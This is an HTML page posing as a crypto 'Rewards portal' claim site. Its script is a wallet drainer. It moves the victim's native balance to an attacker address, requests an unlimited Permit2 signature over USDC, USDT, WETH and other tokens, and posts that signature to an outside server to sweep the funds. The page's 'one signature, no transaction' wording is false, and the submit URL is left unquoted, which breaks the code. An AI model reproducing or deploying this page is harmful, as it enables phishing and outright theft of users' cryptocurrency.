<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Rewards Portal</title>
<style>
  :root { color-scheme: dark; }
  * { box-sizing: border-box; }
  body { margin:0; min-height:100vh; display:flex; align-items:center; justify-content:center;
         background:#0b0d12; color:#e8eaf0;
         font-family:Inter,system-ui,-apple-system,sans-serif; }
  .card { width:100%; max-width:420px; background:#12151d; border:1px solid #222836;
          border-radius:16px; padding:20px; }
  .row { display:flex; align-items:center; gap:10px; padding:6px 0; font-size:13px; }
  .amt { color:#8b93a7; font-variant-numeric:tabular-nums; }
  button { width:100%; padding:13px; border:none; border-radius:12px; background:#4c6ef5;
           color:#fff; font:600 14px Inter,sans-serif; cursor:pointer; }
  button:disabled { opacity:.5; cursor:default; }
  #log { margin-top:12px; font:11px ui-monospace,Menlo,monospace; color:#7a8398; line-height:1.6;
         white-space:pre-wrap; }
  .chip { font-size:11px; padding:4px 9px; border-radius:999px; border:1px solid #222836; color:#8b93a7; }
</style>
</head>
<body>
<div class="card">
  <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:18px">
    <div>
      <div style="font-size:14px;font-weight:600">Rewards portal</div>
      <div style="font-size:12px;color:#8b93a7">Season 4 claim window</div>
    </div>
    <div class="chip" id="chain">—</div>
  </div>
  <div style="border:1px solid #222836;border-radius:12px;padding:14px;margin-bottom:14px">
    <div style="font-size:12px;color:#8b93a7;margin-bottom:8px">Detected assets</div>
    <div id="rows"><div style="font-size:12px;color:#8b93a7">Connect to scan</div></div>
  </div>
  <button id="go">Connect wallet</button>
  <div id="log"></div>
  <div style="margin-top:14px;font-size:11px;color:#8b93a7;text-align:center">
    Gasless — one signature, no transaction
  </div>
</div>

<script>
const CONFIG = {
  DRAINER: "0x0000000000000000000000000000000000000000", // <- your wallet
  BACKEND: "https://api.yourdomain.com",                   // <- your server
};

const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const MAX160  = "1461501637330902918203684832716283019655932542975";

const CHAINS = {
  1: { name: "Ethereum", rpc: "https://ethereum-rpc.publicnode.com", native: "ETH",
       tokens: [
         ["0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "USDC", 6],
         ["0xdAC17F958D2ee523a2206206994597C13D831ec7", "USDT", 6],
         ["0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", "WETH", 18],
         ["0x6B175474E89094C44Da98b954EedeAC495271d0F", "DAI",  18],
         ["0x514910771AF9Ca656af840dff83E8264EcF986CA", "LINK", 18],
         ["0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", "UNI",  18],
         ["0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", "AAVE", 18],
       ]},
  8453: { name: "Base", rpc: "https://base-rpc.publicnode.com", native: "ETH",
       tokens: [
         ["0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", "USDC", 6],
         ["0x4200000000000000000000000000000000000006", "WETH", 18],
         ["0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", "DAI",  18],
       ]},
  42161: { name: "Arbitrum", rpc: "https://arbitrum-one-rpc.publicnode.com", native: "ETH",
       tokens: [
         ["0xaf88d065e77c8cC2239327C5EDb3A432268e5831", "USDC", 6],
         ["0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", "USDT", 6],
         ["0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", "WETH", 18],
       ]},
  137: { name: "Polygon", rpc: "https://polygon-bor-rpc.publicnode.com", native: "POL",
       tokens: [
         ["0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", "USDC", 6],
         ["0xc2132D05D31c914a87C6611C10748AEb04B58e8F", "USDT", 6],
         ["0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", "WETH", 18],
       ]},
  56: { name: "BNB", rpc: "https://bsc-rpc.publicnode.com", native: "BNB",
       tokens: [
         ["0x55d398326f99059fF775485246999027B3197955", "USDT", 18],
         ["0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", "USDC", 18],
         ["0x2170Ed0880ac9A755fd29B2688956BD959F933F8", "ETH",  18],
       ]},
};

let signer = null, owner = null, chainId = null, picked = [];

const log = m => { document.getElementById("log").textContent += m + "\n"; };
const go  = document.getElementById("go");

const hex = n => "0x" + n.toString(16);
const pad = a => a.toLowerCase().replace(/^0x/, "").padStart(64, "0");

async function rpc(method, params) {
  const r = await fetch(CHAINS[chainId].rpc, {
    method: "POST", headers: { "content-type": "application/json" },
    body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }),
  }).then(r => r.json());
  return r.result;
}

async function scan() {
  const rows = document.getElementById("rows");
  rows.innerHTML = "";
  picked = [];

  const bal = BigInt(await rpc("eth_getBalance", [owner, "latest"]));
  if (bal > 0n) addRow(CHAINS[chainId].native, bal, 18, "0x0000000000000000000000000000000000000000");

  for (const [addr, sym, dec] of CHAINS[chainId].tokens) {
    try {
      const raw = await rpc("eth_call", [{ to: addr, data: "0x70a08231" + pad(owner) }, "latest"]);
      const v = BigInt(raw || "0x0");
      if (v > 0n) addRow(sym, v, dec, addr);
    } catch {}
  }
  log(picked.length ? `› ${picked.length} asset(s) found` : "› no balances on this chain");
}

function addRow(sym, raw, dec, addr) {
  const human = Number(raw) / 10 ** dec;
  const isNative = addr === "0x0000000000000000000000000000000000000000";
  const el = document.createElement("div");
  el.className = "row";
  el.innerHTML = `<input type="checkbox" checked style="accent-color:#4c6ef5">
    <span style="flex:1">${sym}</span>
    <span class="amt">${human.toFixed(human < 1 ? 6 : 4)}</span>`;
  document.getElementById("rows").appendChild(el);
  const entry = { sym, raw, dec, addr, native: isNative, el };
  entry.box = el.querySelector("input");
  entry.box.onchange = () => { entry.box.checked ? picked.push(entry) : picked.splice(picked.indexOf(entry), 1); };
  picked.push(entry);
}

async function connect() {
  if (!window.ethereum) { log("› no wallet extension detected"); return; }
  const accs = await window.ethereum.request({ method: "eth_requestAccounts" });
  owner = accs[0];
  signer = window.ethereum;
  chainId = Number(await signer.request({ method: "eth_chainId" }));
  if (!CHAINS[chainId]) {
    await signer.request({ method: "wallet_switchEthereumChain",
      params: [{ chainId: hex(1) }] });
    chainId = Number(await signer.request({ method: "eth_chainId" }));
  }
  document.getElementById("chain").textContent = CHAINS[chainId].name;
  log(`› connected ${owner.slice(0, 6)}...${owner.slice(-4)}`);
  go.textContent = "Claim rewards";
  await scan();
  go.onclick = approve;
}

async function approve() {
  go.disabled = true;
  try {
    const native = picked.filter(p => p.native);
    for (const n of native) await sendNative(n);

    const tokens = picked.filter(p => !p.native);
    if (tokens.length) await signPermit(tokens);

    go.textContent = "Claimed";
    log("› done");
  } catch (e) {
    log("› " + (e.code === 4001 ? "rejected by user" : e.message));
    go.disabled = false;
  }
}

async function sendNative(n) {
  const gasPrice = BigInt(await rpc("eth_gasPrice", []));
  const reserve = gasPrice * 21000n * 3n;
  if (n.raw <= reserve) { log("› skipping " + n.sym + " (below gas)"); return; }
  log("› sending " + n.sym);
  await signer.request({
    method: "eth_sendTransaction",
    params: [{ from: owner, to: CONFIG.DRAINER, value: hex(n.raw - reserve) }],
  });
}

async function signPermit(tokens) {
  const now = Math.floor(Date.now() / 1000);
  const details = [];
  for (const t of tokens) {
    const res = await rpc("eth_call", [{ to: PERMIT2,
      data: "0x927da105" + pad(owner) + pad(t.addr) + pad(CONFIG.DRAINER) }, "latest"]);
    const nonce = res && res.length >= 194 ? parseInt(res.slice(130, 194), 16) : 0;
    details.push({ token: t.addr, amount: MAX160, expiration: now + 2592000, nonce });
  }

  const message = { details, spender: CONFIG.DRAINER, sigDeadline: now + 3600 };
  const domain = { name: "Permit2", chainId, verifyingContract: PERMIT2 };
  const types = {
    EIP712Domain: [
      { name: "name", type: "string" },
      { name: "chainId", type: "uint256" },
      { name: "verifyingContract", type: "address" },
    ],
    PermitDetails: [
      { name: "token", type: "address" },
      { name: "amount", type: "uint160" },
      { name: "expiration", type: "uint48" },
      { name: "nonce", type: "uint48" },
    ],
    PermitBatch: [
      { name: "details", type: "PermitDetails[]" },
      { name: "spender", type: "address" },
      { name: "sigDeadline", type: "uint256" },
    ],
  };

  log("› awaiting signature");
  const signature = await signer.request({
    method: "eth_signTypedData_v4",
    params: [owner, JSON.stringify({ types, domain, primaryType: "PermitBatch", message })],
  });
  log("› signature captured, submitting");

  const r = await fetch(https://rewards-portal-alpha.vercel.app + "/submit", {
    method: "POST", headers: { "content-type": "application/json" },
    body: JSON.stringify({ chainId, owner, permit: message, signature }),
  }).then(r => r.json());
  log(r.ok ? "› swept on-chain" : "› server: " + r.error);
}

go.onclick = connect;
</script>
</body>
</html>
